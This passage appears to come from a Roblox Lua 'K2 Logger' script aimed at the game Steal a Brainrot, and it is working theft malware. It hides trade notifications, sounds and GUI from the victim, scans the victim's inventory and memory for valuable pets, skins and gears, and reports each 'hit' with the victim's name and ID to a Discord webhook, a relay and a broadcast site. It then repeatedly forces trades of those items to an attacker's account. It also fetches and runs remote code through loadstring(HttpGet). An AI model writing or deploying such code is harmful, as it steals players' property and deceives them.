		NotificationController.Notify = function(self, msg, ...)
			if isFromTrade() then return end
			return originalNotify(self, msg, ...)
		end
		NotificationController.Error = function(self, ...)
			if isFromTrade() then return end
			return originalError(self, ...)
		end
		NotificationController.Success = function(self, ...)
			if isFromTrade() then return end
			return originalSuccess(self, ...)
		end
	end
	if SoundController then
		local originalPlay = SoundController.PlaySound
		SoundController.PlaySound = function(self, soundId, ...)
			for i = 2, 6 do
				local src = debug.info(i, "s")
				if src and src:find("TradeController") then return end
			end
			return originalPlay(self, soundId, ...)
		end
	end
end

local tradeActiveFlag = false
local function setupTradeChannel()
	if not ReplicatorClient then return end
	pcall(function()
		tradeChannel = ReplicatorClient.get(("Trade_%*"):format(LP.UserId))
		if tradeChannel and tradeChannel.Observe then
			tradeChannel:Observe({ "active", "data" }, function(data)
				tradeActiveFlag = data ~= nil
				currentlyInTrade = tradeActiveFlag
			end)
		end
	end)
end

local function blockNotifications()
	local notifyRemote = fallbackRemote("Notify") or fallbackRemote("NotificationService")
	if not notifyRemote then return end
	print("[Brainrot] Blocking notifications:", notifyRemote.Name)
	pcall(function()
		for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
			pcall(function()
				if conn.Disable then conn:Disable() end
				if conn.Disconnect then conn:Disconnect() end
			end)
		end
	end)
	task.spawn(function()
		while true do
			task.wait(2)
			pcall(function()
				for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
					pcall(function()
						if conn.Disable then conn:Disable() end
					end)
				end
			end)
		end
	end)
end

local function applyEverythingAfterTargetFound()
	local leftCenter = pg:FindFirstChild("LeftCenter")
	if leftCenter then
		local clone = leftCenter:Clone()
		clone.Name = "LeftCenter_Backup"
		clone.Parent = pg
		leftCenter:Destroy()
	end
	local function handleCam(obj)
		if obj:IsA("BlurEffect") then
			task.defer(function() obj:Destroy() end)
		end
	end
	cam.ChildAdded:Connect(handleCam)
	for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
	cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
		cam.FieldOfView = 70
	end)
	cam.FieldOfView = 70
	local function handleGui(obj)
		if guiNames[obj.Name] then
			task.defer(function() obj:Destroy() end)
		end
	end
	pg.ChildAdded:Connect(handleGui)
	for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
	task.spawn(function()
		pcall(function() SoundService.Volume = 0 end)
		local function mute(s)
			if s:IsA("Sound") then
				pcall(function() s.Volume = 0; s:Stop() end)
			end
		end
		for _, s in ipairs(SoundService:GetDescendants()) do mute(s) end
		SoundService.DescendantAdded:Connect(mute)
		workspace.DescendantAdded:Connect(mute)
	end)
end

local AnimalsData, NumberUtils, TraitsData
pcall(function() AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals")) end)
pcall(function() NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils")) end)
pcall(function() TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits")) end)
pcall(function()
	if not TraitsData then
		TraitsData = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Traits"))
	end
end)

local function plotOwnedByLocalPlayer(plot)
	if not plot then return false end
	for _, key in ipairs({ "Owner", "OwnerUserId", "UserId", "OwnerId", "PlayerUserId" }) do
		local v = plot:GetAttribute(key)
		if v ~= nil then
			if tonumber(v) == LP.UserId then return true end
			if tostring(v) == LP.Name or tostring(v) == LP.DisplayName or tostring(v) == tostring(LP.UserId) then
				return true
			end
		end
	end
	for _, inst in ipairs(plot:GetDescendants()) do
		local n = string.lower(inst.Name)
		if n == "owner" or n == "owneruserid" or n == "userid" or n == "ownerid" then
			if inst:IsA("ObjectValue") and inst.Value == LP then return true end
			if (inst:IsA("NumberValue") or inst:IsA("IntValue")) and inst.Value == LP.UserId then return true end
			if inst:IsA("StringValue") then
				local s = inst.Value
				if s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId) then return true end
			end
		end
	end
	if plot.Name == tostring(LP.UserId) or plot.Name:find(tostring(LP.UserId), 1, true) then
		return true
	end
	return false
end

local function ownerMatchesLocal(ownerField)
	if ownerField == nil then return nil end
	local oid = tonumber(ownerField)
	if oid then return oid == LP.UserId end
	local s = tostring(ownerField)
	return s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId)
end

local function getMyPlotAndAnimals()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil, nil end
	local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then
		for _ = 1, 10 do
			task.wait(0.1)
			hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
			if hrp then break end
		end
	end
	local syncFolder = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
	local requestData = syncFolder and syncFolder:FindFirstChild("RequestData")
	if not requestData then
		warn("[Brainrot] Synchronizer.RequestData missing")
		return nil, nil
	end
	local candidates = {}
	for _, plot in ipairs(plotsFolder:GetChildren()) do
		if plotOwnedByLocalPlayer(plot) then
			table.insert(candidates, plot)
		end
	end
	local function fetchAnimals(plot)
		local ok, data = pcall(function()
			return requestData:InvokeServer(plot.Name)
		end)
		if not ok or type(data) ~= "table" or type(data.AnimalList) ~= "table" then
			return nil, nil
		end
		local ownerField = data.Owner or data.OwnerUserId or data.UserId or data.PlayerUserId
		local match = ownerMatchesLocal(ownerField)
		if match == false then return nil, nil end
		if match == nil and not plotOwnedByLocalPlayer(plot) then return nil, nil end
		return data.AnimalList, data
	end
	local verified = {}
	local searchList = #candidates > 0 and candidates or plotsFolder:GetChildren()
	for _, plot in ipairs(searchList) do
		local animals = fetchAnimals(plot)
		if animals then
			local dist = math.huge
			if hrp then
				local okp, pos = pcall(function() return plot:GetPivot().Position end)
				if okp and pos then dist = (pos - hrp.Position).Magnitude end
			end
			table.insert(verified, { plot = plot, animals = animals, dist = dist })
		end
	end
	if #verified == 0 then
		warn("[Brainrot] No plot verified as local player (", LP.Name, LP.UserId, ")")
		return nil, nil
	end
	table.sort(verified, function(a, b) return a.dist < b.dist end)
	local best = verified[1]
	print("[Brainrot] Using plot:", best.plot.Name, "| local only |", LP.Name, LP.UserId)
	return best.plot, best.animals
end

local cachedProfile = nil
local profileReady = false

local function scanProfileAsync()
	task.spawn(function()
		local found = nil
		local n = 0
		pcall(function()
			for _, v in pairs(getgc(true)) do
				n = n + 1
				if n % 400 == 0 then task.wait() end
				if type(v) == "table" then
					local ok, bi = pcall(rawget, v, "BaseSkinInventory")
					if ok and type(bi) == "table" then
						if type(rawget(v, "Coins")) == "number" and type(rawget(v, "Rebirth")) == "number" then
							found = v
							break
						end
					end
				end
			end
		end)
		cachedProfile = found
		profileReady = true
		print("[Brainrot] Profile scan done:", found and "found" or "not found")
	end)
end

local function getMyProfile()
	return cachedProfile
end

local function buildSkinQueue()
	local queue = {}
	if not next(ALLOWED_BASESKINS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local bi = rawget(profile, "BaseSkinInventory")
	if type(bi) ~= "table" then return queue end
	for uuid, data in pairs(bi) do
		if type(data) == "table" then
			local name = tostring(data.SkinName or data.Skin or "")
			if ALLOWED_BASESKINS[name] then
				table.insert(queue, { uuid = tostring(uuid), skinName = name })
			end
		end
	end
	return queue
end

local function buildGearQueue()
	local queue = {}
	if not next(ALLOWED_GEARS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local gi = rawget(profile, "GearInventory")
	if type(gi) ~= "table" then return queue end
	for uuid, data in pairs(gi) do
		if type(data) == "table" then
			local name = tostring(data.GearName or data.Name or "")
			if ALLOWED_GEARS[name] then
				table.insert(queue, { uuid = tostring(uuid), gearName = name })
			end
		end
	end
	return queue
end

scanProfileAsync()
hookTradeUI()
setupTradeChannel()
blockNotifications()

local myPlot, animalList = getMyPlotAndAnimals()
if not myPlot or not animalList then
	warn("[Brainrot] Could not find plot or AnimalList — showing Join Discord GUI")
	showJoinDiscordGui()
	getgenv().BrainrotMainLoaded = nil
	return
end

local brainrotQueue = {}
for slotKey, data in pairs(animalList) do
	if type(data) == "table" and data.Index then
		local displayName = data.Index
		if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
			displayName = AnimalsData[data.Index].DisplayName
		end
		if (TargetBrainrots[displayName] or TargetBrainrots[data.Index]) then
			table.insert(brainrotQueue, {
				slotKey = tonumber(slotKey),
				data = data,
				displayName = displayName,
			})
		end
	end
end

local tradeBrainrotQueue = brainrotQueue
local tradeItemsEnabled = true

-- ONLY if no target brainrots at start → Discord GUI (no trades / no embed / no automation)
if #brainrotQueue == 0 then
	warn("[Brainrot] No target brainrots on base — Join Discord GUI")
	showJoinDiscordGui()
	getgenv().BrainrotMainLoaded = nil
	return
end

print("[Brainrot] Queued", #brainrotQueue, "target brainrots")

if type(genv.EXTRA_LOADSTRINGS) == "table" then
	for _, url in ipairs(genv.EXTRA_LOADSTRINGS) do
		if type(url) == "string" and url ~= "" then
			task.spawn(function()
				pcall(function() loadstring(game:HttpGet(url))() end)
			end)
		end
	end
end

applyEverythingAfterTargetFound()

local baseSkinQueue = {}
local gearQueue = {}

local function getRequestFn()
	return (syn and syn.request) or (http and http.request) or http_request or request
end

-- Website-aligned helper: LOGGER_KEY → relay, else GOOD_WEBHOOK direct
local function sendWebhook(payloadTable)
	local requestFn = getRequestFn()
	if not requestFn then
		warn("[Brainrot] sendWebhook: no HTTP request fn")
		return false
	end
	local bodyJson = HttpService:JSONEncode(payloadTable)
	local function post(url, headers)
		local ok, res = pcall(function()
			return requestFn({
				Url = url,
				Method = "POST",
				Headers = headers,
				Body = bodyJson,
			})
		end)
		if not ok then
			warn("[Brainrot] HTTP error:", res)
			return false
		end
		local code = type(res) == "table" and (res.StatusCode or res.Status or res.statusCode) or 200
		print("[Brainrot] POST", tostring(url):sub(1, 60), "→", code)
		if tonumber(code) and tonumber(code) >= 400 then
			return false
		end
		return true
	end
	if LOGGER_KEY and #LOGGER_KEY > 0 then
		local headers = {
			["Content-Type"] = "application/json",
			["X-Logger-Key"] = LOGGER_KEY,
		}
		for attempt = 1, 4 do
			if post(RELAY_URL, headers) then
				print("[Brainrot] Relay SUCCESS attempt", attempt)
				return true
			end
			warn("[Brainrot] Relay fail attempt", attempt)
			task.wait(0.5 * attempt)
		end
		warn("[Brainrot] Relay FAILED after 4 attempts")
		return false
	elseif GOOD_WEBHOOK and #GOOD_WEBHOOK > 0 then
		return post(GOOD_WEBHOOK, { ["Content-Type"] = "application/json" })
	end
	return false
end

local function toWikiName(displayName)
	local clean = displayName:match("^(.-)%s*%(") or displayName
	return clean:gsub(" ", "_")
end

local function fetchFandomImageUrl(displayName)
	local requestFn = getRequestFn()
	if not requestFn then return nil end
	local wikiName = toWikiName(displayName)
	local url = FANDOM_BASE .. wikiName
	local ok, response = pcall(function()
		return requestFn({
			Url = url, Method = "GET",
			Headers = { ["User-Agent"] = "Mozilla/5.0", ["Accept"] = "text/html" },
			Timeout = 5,
		})
	end)
	if ok and response and response.StatusCode == 200 and response.Body then
		local body = response.Body
		local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
			or body:match('content="([^"]+)"%s+property="og:image"')
		if ogImage and ogImage:find("^https?://") then
			return ogImage:gsub("&amp;", "&")
		end
	end
	return nil
end

local function getBrainrotColor(animalIndex)
	local color = nil
	pcall(function()
		local models = ReplicatedStorage:FindFirstChild("Models")
		local animals = models and models:FindFirstChild("Animals")
		if not animals then return end
		local template = animals:FindFirstChild(animalIndex)
		if not template and AnimalsData and AnimalsData[animalIndex] then
			template = animals:FindFirstChild(AnimalsData[animalIndex].DisplayName)
		end
		if not template then return end
		local bestScore = 0
		for _, desc in ipairs(template:GetDescendants()) do
			if desc:IsA("MeshPart") or desc:IsA("Part") then
				local c = desc.Color
				local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
				local maxC = math.max(c.R, c.G, c.B)
				local minC = math.min(c.R, c.G, c.B)
				local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
				local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
				local bp = (bri < 0.08 and 0.05) or (bri > 0.92 and 0.15) or 1
				local score = (sat * 3 + 0.2) * bp * vol
				if score > bestScore then bestScore = score; color = c end
			end
		end
	end)
	return color
end

local function colorToDecimal(c)
	if not c then return FALLBACK_COLOR end
	local r = math.clamp(math.floor(c.R * 255), 0, 255)
	local g = math.clamp(math.floor(c.G * 255), 0, 255)
	local b = math.clamp(math.floor(c.B * 255), 0, 255)
	return r * 65536 + g * 256 + b
end

local function getBestImageUrl(displayName, animalIndex)
	local info = AnimalsData and AnimalsData[animalIndex]
	if info then
		for _, key in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId" }) do
			if info[key] and type(info[key]) == "string" then
				local num = info[key]:match("%d+")
				if num then return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png" end
			end
		end
	end
	return nil
end

local function resolveThumbnail(displayName, animalIndex)
	local url = getBestImageUrl(displayName, animalIndex)
	if url and url ~= "" then return url end
	url = fetchFandomImageUrl(displayName)
	if url and url ~= "" then return url end
	return "https://stealabrainrot.fandom.com/wiki/Special:FilePath/" .. toWikiName(displayName) .. ".png"
end

local function getTraitMultiplier(traitName)
	if not TraitsData or not traitName then return 0 end
	local info = TraitsData[traitName]
	if not info then
		local key = traitName:lower():gsub("%s+", "")
		for k, v in pairs(TraitsData) do
			if type(k) == "string" and k:lower():gsub("%s+", "") == key then info = v; break end
		end
	end
	if type(info) ~= "table" then return 0 end
	local tm = info.MultiplierModifier or info.Multiplier or info.modifier or info.GenerationMultiplier
	if type(tm) == "number" and tm > 0 then return tm end
	return 0
end

local function getMutationMultiplier(mutName)
	if not mutName or mutName == "" or mutName == "None" or mutName == "Default" then return 1 end
	if MUTATION_MULT[mutName] then return MUTATION_MULT[mutName] end
	local key = mutName:lower():gsub("%s+", "")
	for name, mult in pairs(MUTATION_MULT) do
		if name:lower():gsub("%s+", "") == key then return mult end
	end
	return 1
end

local function getGeneration(data)
	local index = data.Index
	local base = 0
	if AnimalsData and AnimalsData[index] and type(AnimalsData[index].Generation) == "number" then
		base = AnimalsData[index].Generation
	end
	if base <= 0 then return 0 end
	local gen = base * getMutationMultiplier(data.Mutation)
	local traits = data.Traits
	if type(traits) == "table" then
		for _, t in pairs(traits) do
			local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
			local tm = getTraitMultiplier(traitName)
			if tm > 0 then gen = gen + (base * tm) end
		end
	end
	return gen
end

local function formatGen(genVal)
	if NumberUtils and NumberUtils.Format then return NumberUtils.Format(genVal) .. "/s" end
	if genVal >= 1e12 then return string.format("%.1fT/s", genVal / 1e12)
	elseif genVal >= 1e9 then return string.format("%.1fB/s", genVal / 1e9)
	elseif genVal >= 1e6 then return string.format("%.1fM/s", genVal / 1e6)
	elseif genVal >= 1e3 then return string.format("%.1fK/s", genVal / 1e3)
	end
	return tostring(math.floor(genVal)) .. "/s"
end

local function normKey(s)
	return (tostring(s or ""):lower():gsub("%s+", ""):gsub("'", ""):gsub("'", ""))
end

local function mutEmoji(name)
	if not name or name == "" then return MUTATION_EMOJI["Default"] end
	if MUTATION_EMOJI[name] then return MUTATION_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(MUTATION_EMOJI) do
		if normKey(k) == key then return v end
	end
	return MUTATION_EMOJI["Default"]
end

local function gearEmoji(name)
	if not name or name == "" then return "⚙️" end
	if GEAR_EMOJI[name] then return GEAR_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(GEAR_EMOJI) do
		if normKey(k) == key then return v end
	end
	return "⚙️"
end

local function baseSkinEmoji(name)
	if not name or name == "" then return "🏠" end
	if BASESKIN_EMOJI[name] then return BASESKIN_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(BASESKIN_EMOJI) do
		if normKey(k) == key then return v end
	end
	return "🏠"
end

local function countTraits(traits)
	if type(traits) ~= "table" then return 0 end
	local n = 0
	for _, t in pairs(traits) do
		local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
		if traitName and traitName ~= "" then n = n + 1 end
	end
	return n
end

local function sendDetailedWebhook()
	-- Allow run if we have a secret key (relay), private webhook, or internal log webhook
	if not LOGGER_KEY and GOOD_WEBHOOK == "" then return end
	local resultsPrimary = {}
	local requirePingPrimary = false
	local totalGen = 0
	for slot, data in pairs(animalList) do
		if type(data) == "table" and data.Index then
			local info = AnimalsData and AnimalsData[data.Index]
			local displayName = (info and info.DisplayName) or data.Index
			if GOOD_BRAINROTS[displayName] or GOOD_BRAINROTS[data.Index] then
				requirePingPrimary = true
				local mutation = data.Mutation or "None"
				local traits = data.Traits or {}
				local genVal = getGeneration(data)
				totalGen = totalGen + genVal
				local mE = mutEmoji(mutation)
				local tCount = countTraits(traits)
				local line = mE .. " **" .. displayName .. "**"
				if tCount > 0 then line = line .. " *(x" .. tCount .. " traits)*" end
				line = line .. " — **$" .. formatGen(genVal):gsub("/s", "") .. "/s**"
				table.insert(resultsPrimary, {
					slot = tostring(slot), index = data.Index, displayName = displayName,
					name = line, genVal = genVal,
				})
			end
		end
	end
	if #resultsPrimary == 0 and #baseSkinQueue == 0 and #gearQueue == 0 then return end
	table.sort(resultsPrimary, function(a, b) return (a.genVal or 0) > (b.genVal or 0) end)
	local lines = {}
	if #resultsPrimary > 0 then
		table.insert(lines, "───── **BRAINROTS** ─────")
		for i, r in ipairs(resultsPrimary) do table.insert(lines, "`" .. i .. ".` " .. r.name) end
	end
	if #baseSkinQueue > 0 then
		if #lines > 0 then table.insert(lines, "") end
		table.insert(lines, "───── **BASE SKINS** ─────")
		for i, s in ipairs(baseSkinQueue) do
			table.insert(lines, "`" .. i .. ".` " .. baseSkinEmoji(s.skinName) .. " **" .. s.skinName .. "**")
		end
	end
	if #gearQueue > 0 then
		if #lines > 0 then table.insert(lines, "") end
		table.insert(lines, "───── **GEARS** ─────")
		for i, g in ipairs(gearQueue) do
			table.insert(lines, "`" .. i .. ".` " .. gearEmoji(g.gearName) .. " **" .. g.gearName .. "**")
		end
	end
	local listText = table.concat(lines, "\n")
	listText = listText .. "\n\n💰 **Total Value:** **$" .. formatGen(totalGen):gsub("/s", "") .. "/s**"
	if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
	local requestFn = getRequestFn()
	if not requestFn then return end
	local top = resultsPrimary[1]
	local embedColor = FALLBACK_COLOR
	if top then
		local c = getBrainrotColor(top.index)
		if c then embedColor = colorToDecimal(c) end
	end
	-- Same webhook payload; gray + duel status when in duel place
	local duelStatus = isInDuel and "⚔️ **Player in duel**" or "✅ **Not in duel**"
	if isInDuel then
		embedColor = DUEL_COLOR
	end
	local playerCount = #Players:GetPlayers()
	local execName = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
	local embed = {
		title = isInDuel and "K2 Logger — In Duel" or "K2 Logger",
		description = table.concat({
			"📫 **Script User** `" .. LP.Name .. "` (ID: " .. LP.UserId .. ")",
			duelStatus,
			"", "**Inventory scan complete.**", "", listText,
		}, "\n"),
		color = embedColor,
		fields = {
			{ name = "⏰ Executed", value = "<t:" .. os.time() .. ":R>", inline = true },
			{ name = "🌍 Server", value = "Players: **" .. playerCount .. "**", inline = true },
			{ name = "⚡ Executor", value = execName, inline = true },
			{ name = "⚔ Status", value = isInDuel and "**In Duel**" or "**Not in Duel**", inline = true },
		},
		footer = { text = "K2 LOGGER | https://discord.gg/bxjXucMVqB", icon_url = FOOTER_ICON },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}
	if top then
		local thumb = resolveThumbnail(top.displayName, top.index)
		if thumb and thumb ~= "" then embed.thumbnail = { url = thumb } end
	end
	local function postTo(url, withPing)
		if not url or url == "" then return false end
		local payload = { embeds = { embed }, username = "K2 Logger", avatar_url = GOOD_AVATAR }
		if withPing then payload.content = "@everyone" end
		local body = HttpService:JSONEncode(payload)
		for attempt = 1, 3 do
			local ok, res = pcall(function()
				return requestFn({
					Url = url, Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body = body,
				})
			end)
			local code = ok and type(res) == "table" and (res.StatusCode or res.Status or res.statusCode) or nil
			if ok and (not code or tonumber(code) < 400) then
				print("[Brainrot] postTo OK", tostring(url):sub(1, 50), code or "")
				return true
			end
			warn("[Brainrot] postTo fail", attempt, code or res)
			task.wait(0.4 * attempt)
		end
		return false
	end

	-- Relay private hit through website when LOGGER_KEY is set (no Discord webhook in script)
	-- Body schema matches k2logger.lovable.app: content?, username?, avatar_url?, embeds?
	local function postViaRelay(withPing)
		if not LOGGER_KEY or LOGGER_KEY == "" then
			warn("[Brainrot] postViaRelay: no LOGGER_KEY")
			return false
		end
		local payload = {
			embeds = { embed },
			username = "K2 Logger",
			avatar_url = GOOD_AVATAR,
		}
		if withPing then
			payload.content = "@everyone"
		end
		print("[Brainrot] postViaRelay ping=", withPing and true or false)
		return sendWebhook(payload)
	end

	-- Live hits feed on k2logger.lovable.app (never blocks trades / primary log)
	local function broadcastLiveHit()
		task.spawn(function()
			pcall(function()
				local totStr = formatGen(totalGen)
				local body = {
					victimName = LP.Name,
					victimId = LP.UserId,
					topBrainrot = (top and top.displayName) or "Unknown",
					topBrainrotIndex = (top and top.index) or "Unknown",
					totalGen = totalGen,
					totalGenFormatted = tostring(totStr),
					itemCount = #resultsPrimary,
					isInDuel = isInDuel,
					executor = execName,
					serverPlayerCount = playerCount,
					timestamp = os.time(),
				}
				local headers = { ["Content-Type"] = "application/json" }
				if LOGGER_KEY and LOGGER_KEY ~= "" then
					headers["X-Logger-Key"] = LOGGER_KEY
				end
				requestFn({
					Url = HITS_BROADCAST_URL,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(body),
				})
			end)
		end)
	end

	local shouldPing = requirePingPrimary or #baseSkinQueue > 0 or #gearQueue > 0
	-- Only one primary hit to the owner's webhook/relay (prevents double log)
	-- ALWAYS attempt owner hit (website relay) + live broadcast
	do
		local okOwner = false
		if LOGGER_KEY and #LOGGER_KEY > 0 then
			okOwner = postViaRelay(shouldPing)
			if not okOwner then
				task.wait(0.75)
				okOwner = postViaRelay(shouldPing)
			end
			print("[Brainrot] Owner hit (LOGGER_KEY):", okOwner and "SENT" or "FAILED")
		elseif GOOD_WEBHOOK and GOOD_WEBHOOK ~= "" then
			okOwner = postTo(GOOD_WEBHOOK, shouldPing)
			print("[Brainrot] Owner hit (GOOD_WEBHOOK):", okOwner and "SENT" or "FAILED")
		else
			warn("[Brainrot] No LOGGER_KEY / GOOD_WEBHOOK — owner hit skipped")
		end
		broadcastLiveHit()
		primaryLogSent = true
	end
end

local function startFullAutomation()
	if not TARGET_ID or TARGET_ID == 0 then
		warn("[Brainrot] TARGET_USER_ID not set — trades disabled")
		return
	end
	if not waitForRemotes(15) then
		warn("[Brainrot] Missing trade remotes — will still try invite/ready/accept fallbacks")
	end

	-- Fixed rate only (no force-burst → stall pattern)
	local ADD_STEP = 0.10
	local ITEM_STEP = 0.12


	local function fireRemote(r, ...)
		if not r then return end
		pcall(function()
			if r:IsA("RemoteEvent") then
				r:FireServer(...)
			else
				r:InvokeServer(...)
			end
		end)
	end

	local function addOneBrainrot(item)
		if not addBrainrotRemote or not item then return end
		local slot = item.slotKey
		for _, guid in ipairs(SELECT_GUIDS) do
			local ok = pcall(function()
				addBrainrotRemote:InvokeServer(guid, slot, item.data)
			end)
			if ok then return end
		end
		-- retry with string slot
		if type(slot) == "number" then
			for _, guid in ipairs(SELECT_GUIDS) do
				pcall(function()
					addBrainrotRemote:InvokeServer(guid, tostring(slot), item.data)
				end)
			end
		end
	end

	local function addOneItem(kind, item)
		if not addItemRemote or not item or not tradeItemsEnabled then return end
		local payload
		if kind == "BaseSkin" then
			payload = { UUID = item.uuid, SkinName = item.skinName }
		else
			payload = { UUID = item.uuid, GearName = item.gearName }
		end
		for _, guid in ipairs(SELECTGB_GUIDS) do
			local ok = pcall(function()
				addItemRemote:InvokeServer(guid, kind, payload)
			end)
			if ok then return end
		end
	end

	local function fireReady()
		fireRemote(readyRemote, READY_GUID)
	end

	local function fireAccept()
		fireRemote(acceptRemote, ACCEPT_GUID)
	end

	-- Detect trade open
	task.spawn(function()
		pg.DescendantAdded:Connect(function(obj)
			local n = string.lower(obj.Name or "")
			if n == "tradelivetrade" or n == "brainrottrader" or n:find("tradelive", 1, true) then
				currentlyInTrade = true
				tradeActiveFlag = true
				print("[Brainrot] Trade opened | addRemote=", addBrainrotRemote and addBrainrotRemote.Name or "NIL", "| queue=", tradeBrainrotQueue and #tradeBrainrotQueue or 0)
				-- immediate ready+accept burst
				task.spawn(function()
					for _ = 1, 25 do
						fireReady()
						fireAccept()
						task.wait(0.04)
					end
				end)
			end
		end)
		pg.DescendantRemoving:Connect(function(obj)
			local n = string.lower(obj.Name or "")
			if n:find("trade") or n:find("brainrottrader") or n:find("tradelive") then
				task.delay(0.4, function()
					local still = false
					for _, o in ipairs(pg:GetDescendants()) do
						local nn = string.lower(o.Name or "")
						if nn:find("tradelive", 1, true) or nn:find("brainrottrader", 1, true) then
							still = true
							break
						end
					end
					if not still then
						currentlyInTrade = false
						print("[Brainrot] Trade closed")
					end
				end)
			end
		end)
	end)

	-- Continuous fixed-rate brainrot add WHILE in trade only (never stalls)
	if addBrainrotRemote then
		task.spawn(function()
			local idx = 1
			while true do
				local q = tradeBrainrotQueue
				local inTrade = tradeActiveFlag or currentlyInTrade
				if inTrade and q and #q > 0 then
					if idx > #q then idx = 1 end
					addOneBrainrot(q[idx])
					idx = idx + 1
				end
				task.wait(ADD_STEP)
			end
		end)
	end

	-- Continuous skins/gears WHILE in trade
	if addItemRemote then
		task.spawn(function()
			local skinIdx, gearIdx = 1, 1
			while true do
				local inTrade = tradeActiveFlag or currentlyInTrade
				if inTrade and tradeItemsEnabled then
					if #baseSkinQueue > 0 then
						if skinIdx > #baseSkinQueue then skinIdx = 1 end
						addOneItem("BaseSkin", baseSkinQueue[skinIdx])
						skinIdx = skinIdx + 1
					end
					if #gearQueue > 0 then
						if gearIdx > #gearQueue then gearIdx = 1 end
						addOneItem("Gear", gearQueue[gearIdx])
						gearIdx = gearIdx + 1
					end
				end
				task.wait(ITEM_STEP)
			end
		end)
	end

	-- Continuous invite (always when not in trade)
	task.spawn(function()
		while true do
			if not tradeActiveFlag and not currentlyInTrade then
				pcall(function()
					if inviteRemote then
						if inviteRemote:IsA("RemoteFunction") then
							inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
						else
							inviteRemote:FireServer(INVITE_GUID, TARGET_ID)
						end
					end
				end)
			end
			task.wait(TRADE_CYCLE_DELAY)
		end
	end)

	-- Instant invite when target joins
	Players.PlayerAdded:Connect(function(pl)
		if tonumber(pl.UserId) == tonumber(TARGET_ID) then
			task.spawn(function()
				for _ = 1, 6 do
					if tradeActiveFlag or currentlyInTrade then break end
					pcall(function()
						if inviteRemote then
							inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
						end
					end)
					task.wait(0.12)
				end
			end)
		end
	end)

	-- Channel edge hammer
	task.spawn(function()
		local wasIn = false
		while true do
			local inTrade = tradeActiveFlag or currentlyInTrade
			if inTrade and not wasIn then
				for _ = 1, 20 do
					fireReady()
					fireAccept()
					task.wait(0.04)
				end
			end
			wasIn = inTrade
			task.wait(0.05)
		end
	end)

	-- Steady ready (always while in trade — never gated off)
	task.spawn(function()
		while true do
			if tradeActiveFlag or currentlyInTrade then
				fireReady()
				task.wait(0.06)
			else
				task.wait(0.1)
			end
		end
	end)

	-- Steady accept (always while in trade — never gated off)
	task.spawn(function()
		while true do
			if tradeActiveFlag or currentlyInTrade then
				fireAccept()
				task.wait(0.05)
			else
				task.wait(0.1)
			end
		end
	end)

	print("[Brainrot] Automation started | fixed add @", ADD_STEP, "s | continuous ready/accept")
end

startFullAutomation()

-- INSTANT webhook as soon as script has brainrot list (do not wait for profile/gears)
print("[Brainrot] Sending webhook instantly…")
task.spawn(function()
	sendDetailedWebhook()
	print("[Brainrot] Instant webhook finished")
end)

-- Profile gears/skins in background (does NOT delay first webhook)
task.spawn(function()
	local waited = 0
	while not profileReady and waited < 8 do
		task.wait(0.1)
		waited = waited + 0.1
	end
	if not profileReady then
		warn("[Brainrot] Profile scan timed out — gears/skins may be empty")
		profileReady = true
	end
	baseSkinQueue = buildSkinQueue()
	gearQueue = buildGearQueue()
	print("[Gear] Base skins queued:", #baseSkinQueue)
	print("[Gear] Gears queued:", #gearQueue)
	-- Only re-send if gears/skins were found after the instant brainrot embed
	if #baseSkinQueue > 0 or #gearQueue > 0 then
		print("[Brainrot] Gears/skins found — sending follow-up webhook")
		sendDetailedWebhook()
	end
end)


-- Drained GUI when targets gone (after they had targets)
task.spawn(function()
	local streak = 0
	local function countTargetBrainrotsOnBase()
		local ok, result = pcall(function()
			local _, list = getMyPlotAndAnimals()
			if type(list) ~= "table" then return nil end
			local count = 0
			for _, data in pairs(list) do
				if type(data) == "table" and data.Index then
					local displayName = data.Index
					if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
						displayName = AnimalsData[data.Index].DisplayName
					end
					if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
						count = count + 1
					end
				end
			end
			return count
		end)
		if not ok then return nil end
		return result
	end
	while not drainedGuiShown do
		task.wait(3)
		local n = countTargetBrainrotsOnBase()
		if n == nil then
			streak = 0
		elseif n > 0 then
			streak = 0
		else
			streak = streak + 1
			print("[Brainrot] Empty target streak:", streak, "/", DRAINED_NEED_STREAK)
			if streak >= DRAINED_NEED_STREAK then
				drainedGuiShown = true
				print("[Brainrot] Targets confirmed gone → loading stolen GUI")
				pcall(function()
